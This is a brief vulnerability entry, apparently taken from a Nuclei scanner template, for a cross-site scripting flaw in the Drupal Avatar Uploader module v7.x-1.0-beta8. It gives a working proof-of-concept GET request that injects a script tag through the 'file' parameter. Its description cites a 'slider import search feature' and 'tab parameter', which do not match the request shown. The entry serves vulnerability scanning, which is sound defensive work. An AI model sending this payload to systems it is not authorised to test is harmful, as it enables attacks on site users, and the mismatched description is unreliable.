# Vulnerability: Drupal Avatar Uploader - Cross-Site Scripting
**Classification:** CWE-80
**Source:** Nuclei Template (`drupal-avatar-xss.yaml`)

## Description
Drupal Avatar Uploader v7.x-1.0-beta8 plugin contains a cross-site scripting vulnerability in the slider import search feature and tab parameter via plugin settings.

## Vulnerable Code Pattern / Exploit Payload
```http
GET {{BaseURL}}/avatar_uploader.pages.inc?file=%3Cscript%3Ealert(document.domain)%3C%2Fscript%3E
```

